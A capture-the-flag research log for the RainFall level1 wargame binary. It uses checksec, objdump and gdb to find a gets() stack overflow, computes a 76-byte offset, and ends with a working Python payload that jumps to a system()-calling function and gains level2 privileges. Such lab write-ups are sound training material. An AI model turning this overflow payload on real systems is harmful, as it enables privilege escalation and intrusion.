# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

### Let's analise what we have:

```bash

level1@RainFall:~$ checksec --dir .
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   .level1


level1@RainFall:~$ objdump -Rw ./level1 

./level1:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049788 R_386_GLOB_DAT    __gmon_start__
080497c0 R_386_COPY        stdout
08049798 R_386_JUMP_SLOT   gets
0804979c R_386_JUMP_SLOT   fwrite
080497a0 R_386_JUMP_SLOT   system
080497a4 R_386_JUMP_SLOT   __gmon_start__
080497a8 R_386_JUMP_SLOT   __libc_start_main


level1@RainFall:~$ objdump -tw -j .text ./level1 

./level1:     file format elf32-i386

SYMBOL TABLE:
08048390 l    d  .text	00000000              .text
080483c0 l     F .text	00000000              __do_global_dtors_aux
08048420 l     F .text	00000000              frame_dummy
08048520 l     F .text	00000000              __do_global_ctors_aux
08048510 g     F .text	00000002              __libc_csu_fini
08048512 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
08048444 g     F .text	0000003c              run
080484a0 g     F .text	00000061              __libc_csu_init
08048390 g     F .text	00000000              _start
08048480 g     F .text	00000017              main
level1@RainFall:~$ gdb ./level1
```

### Analisys shows that the binary uses the vulnerable function `gets`

```gdb
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disassemble main 
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb) br *main+16
Breakpoint 2 at 0x8048490
(gdb) r
   0x8048480 <main>:	push   ebp
   0x8048481 <main+1>:	mov    ebp,esp
   0x8048483 <main+3>:	and    esp,0xfffffff0
   0x8048486 <main+6>:	sub    esp,0x50
   0x8048489 <main+9>:	lea    eax,[esp+0x10]
   0x804848d <main+13>:	mov    DWORD PTR [esp],eax
=> 0x8048490 <main+16>:	call   0x8048340 <gets@plt>
   0x8048495 <main+21>:	leave  
   0x8048496 <main+22>:	ret    
   0x8048497:	nop
   0x8048498:	nop
   0x8048499:	nop
   0x804849a:	nop
   0x804849b:	nop
   0x804849c:	nop
   0x804849d:	nop

(gdb) bt
#0  0x08048490 in main ()
#1  0xb7e41533 in __libc_start_main (main=0x8048480 <main>, argc=1, ubp_av=0xbffff854, init=0x80484a0 <__libc_csu_init>, fini=0x8048510 <__libc_csu_fini>, rtld_fini=0xb7fed340 <_dl_fini>, stack_end=0xbffff84c) at libc-start.c:226
#2  0x080483b1 in _start ()

(gdb) i fra
Stack level 0, frame at 0xbffff7c0:
 eip = 0x8048490 in main; saved eip 0xb7e41533
 called by frame at 0xbffff830
 Arglist at 0xbffff7b8, args: 
 Locals at 0xbffff7b8, Previous frame's sp is 0xbffff7c0
 Saved registers:
  ebp at 0xbffff7b8, eip at 0xbffff7bc

(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.

(gdb) i line run
No line number information available for address 0x8048444 <run>

(gdb) p 0xbffff7bc - $eax
$7 = 76
```

so to speak in order to exploit the overflow we would need to generate 76 bytes 
of dummy bytes followed by the address `0x8048444` of the function `run()` 

```gdb
(gdb) start < <(python -c "import struct; print 'c' * 76 + struct.pack('<I', 0x08048444)")
Temporary breakpoint 3 at 0x8048483
   0x8048473 <run+47>:	add    al,0x24
   0x8048475 <run+49>:	test   BYTE PTR [ebp-0x1d17f7fc],al
   0x804847b <run+55>:	(bad)  
   0x804847c <run+56>:	(bad)  
   0x804847d <run+57>:	dec    ecx
   0x804847f <run+59>:	ret    
   0x8048480 <main>:	push   ebp
   0x8048481 <main+1>:	mov    ebp,esp
=> 0x8048483 <main+3>:	and    esp,0xfffffff0
   0x8048486 <main+6>:	sub    esp,0x50
   0x8048489 <main+9>:	lea    eax,[esp+0x10]
   0x804848d <main+13>:	mov    DWORD PTR [esp],eax
   0x8048490 <main+16>:	call   0x8048340 <gets@plt>
   0x8048495 <main+21>:	leave  
   0x8048496 <main+22>:	ret    
   0x8048497:	nop
(gdb) i fra
Stack level 0, frame at 0xbffff7c0:
 eip = 0x8048483 in main; saved eip 0xb7e41533
 called by frame at 0xbffff830
 Arglist at 0xbffff7b8, args: 
 Locals at 0xbffff7b8, Previous frame's sp is 0xbffff7c0
 Saved registers:
  ebp at 0xbffff7b8, eip at 0xbffff7bc
(gdb) watch *0xbffff7bc
Hardware watchpoint 4: *0xbffff7bc
(gdb) c
   0xb7ea6bf6 <__memcpy_ia32+54>:	add    BYTE PTR [eax],al
   0xb7ea6bf8 <__memcpy_ia32+56>:	add    BYTE PTR [edx+eax*1-0x5c],dh
   0xb7ea6bfc <__memcpy_ia32+60>:	dec    ecx
   0xb7ea6bfd <__memcpy_ia32+61>:	push   eax
   0xb7ea6bfe <__memcpy_ia32+62>:	mov    eax,ecx
   0xb7ea6c00 <__memcpy_ia32+64>:	shr    ecx,0x2
   0xb7ea6c03 <__memcpy_ia32+67>:	and    eax,0x3
=> 0xb7ea6c06 <__memcpy_ia32+70>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0xb7ea6c08 <__memcpy_ia32+72>:	mov    ecx,eax
   0xb7ea6c0a <__memcpy_ia32+74>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0xb7ea6c0c <__memcpy_ia32+76>:	pop    eax
   0xb7ea6c0d <__memcpy_ia32+77>:	mov    edi,eax
   0xb7ea6c0f <__memcpy_ia32+79>:	mov    esi,edx
   0xb7ea6c11 <__memcpy_ia32+81>:	mov    eax,DWORD PTR [esp+0x4]
   0xb7ea6c15 <__memcpy_ia32+85>:	ret    
   0xb7ea6c16 <__memcpy_ia32+86>:	shr    ecx,1
Hardware watchpoint 4: *0xbffff7bc

Old value = -1209789133
New value = 134513732
__memcpy_ia32 () at ../sysdeps/i386/i686/multiarch/../memcpy.S:75
75	../sysdeps/i386/i686/multiarch/../memcpy.S: No such file or directory.
(gdb) br run
Breakpoint 5 at 0x804844a
(gdb) c
   0x8048435 <frame_dummy+21>:	(bad)  
   0x8048436 <frame_dummy+22>:	je     0x8048441 <frame_dummy+33>
   0x8048438 <frame_dummy+24>:	mov    DWORD PTR [esp],0x80496bc
   0x804843f <frame_dummy+31>:	call   eax
   0x8048441 <frame_dummy+33>:	leave  
   0x8048442 <frame_dummy+34>:	ret    
   0x8048443 <frame_dummy+35>:	nop
   0x8048444 <run>:	push   ebp
=> 0x8048445 <run+1>:	mov    ebp,esp
   0x8048447 <run+3>:	sub    esp,0x18
   0x804844a <run+6>:	mov    eax,ds:0x80497c0
   0x804844f <run+11>:	mov    edx,eax
   0x8048451 <run+13>:	mov    eax,0x8048570
   0x8048456 <run+18>:	mov    DWORD PTR [esp+0xc],edx
   0x804845a <run+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x8048462 <run+30>:	mov    DWORD PTR [esp+0x4],0x1
Hardware watchpoint 4: *0xbffff7bc

Old value = 134513732
New value = 1667457891
0x08048445 in run ()
```

## Finally

```bash
level1@RainFall:~$ (python -c "import struct; print 'c' * 76 + struct.pack('<I', 0x08048444)"; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
```
